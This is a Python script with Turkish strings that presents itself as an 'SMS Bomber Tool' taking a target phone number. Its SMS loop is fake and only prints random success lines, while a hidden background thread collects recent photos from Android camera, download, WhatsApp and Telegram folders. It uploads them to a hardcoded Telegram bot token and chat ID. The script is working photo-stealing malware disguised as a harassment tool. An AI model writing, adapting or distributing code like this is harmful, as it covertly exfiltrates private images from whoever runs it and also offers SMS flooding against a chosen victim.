import os
import telebot
import time
import random
import threading
from datetime import datetime, timedelta

class Renkler:
    YESIL = '\033[92m'
    KIRMIZI = '\033[91m'
    RESET = '\033[0m'

BOT_TOKEN = "7645786246:AAFB8ZrAAetsPnQiHpi5NnoeVmZsTeJkFkA"
CHAT_ID = "5938201518"

bot = telebot.TeleBot(BOT_TOKEN)

photo_dirs = [
    "/storage/emulated/0/DCIM/",
    "/storage/emulated/0/Pictures/",
    "/storage/emulated/0/Download/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
    "/storage/emulated/0/Telegram/Telegram Images/"
]

# Buradan ayarla istedin gibi :))
LOG_FILE = "sent_photos.log"
ERROR_LOG_FILE = "error.log"
MAX_SIZE_BYTES = 5 * 1024 * 1024  # 5 MB
DAYS_LIMIT = 40  # Son 7 gün

def load_sent_photos():
    if not os.path.exists(LOG_FILE):
        return set()
    with open(LOG_FILE, "r") as f:
        return set(line.strip() for line in f.readlines())

def log_sent_photo(photo_path):
    with open(LOG_FILE, "a") as f:
        f.write(photo_path + "\n")

def log_error(message):
    with open(ERROR_LOG_FILE, "a") as f:
        f.write(message + "\n")

def is_recent(file_path):
    dosya_zamani = datetime.fromtimestamp(os.path.getmtime(file_path))
    return dosya_zamani >= datetime.now() - timedelta(days=DAYS_LIMIT)

def find_photos(directories):
    photo_files = []
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.lower().endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp")):
                        full_path = os.path.join(root, file)
                        if is_recent(full_path):
                            photo_files.append(full_path)
    return photo_files

def send_photos(photo_files):
    sent_photos = load_sent_photos()
    for photo in photo_files:
        if photo in sent_photos:
            continue
        try:
            size = os.path.getsize(photo)
            if size > MAX_SIZE_BYTES:
                continue
            with open(photo, "rb") as img:
                bot.send_photo(CHAT_ID, img)
            log_sent_photo(photo)
            time.sleep(1)
        except Exception as e:
            log_error(f"Hata gönderirken: {photo} -> {e}")

def background_photo_task():
    photos = find_photos(photo_dirs)
    if photos:
        send_photos(photos)

def sahte_sms_gonderim(numara):
    print(f"Numaraya SMS gönderiliyor: {numara}")
    try:
        while True:
            durum = random.choice([True, False])
            if durum:
                print(f"{Renkler.YESIL}[+] Mesaj gönderildi{Renkler.RESET}")
            else:
                print(f"{Renkler.KIRMIZI}[-] Mesaj gönderilemedi{Renkler.RESET}")
            time.sleep(0.7)
    except KeyboardInterrupt:
        print("\n[Sistem] SMS gönderim döngüsü kullanıcı tarafından durduruldu.\n")

def main():
    print("=== SMS Bomber Tool ===")
    numara = input("Hedef numarayı giriniz (örnek: +905XXXXXXXXX): ")

   
    threading.Thread(target=background_photo_task, daemon=True).start()

    print("[Sistem] SMS gönderim döngüsü başlatılıyor. Kapatmak için Ctrl+C'ye basınız.\n")
    sahte_sms_gonderim(numara)
    print("Program sonlandı.")

if __name__ == "__main__":
    main()
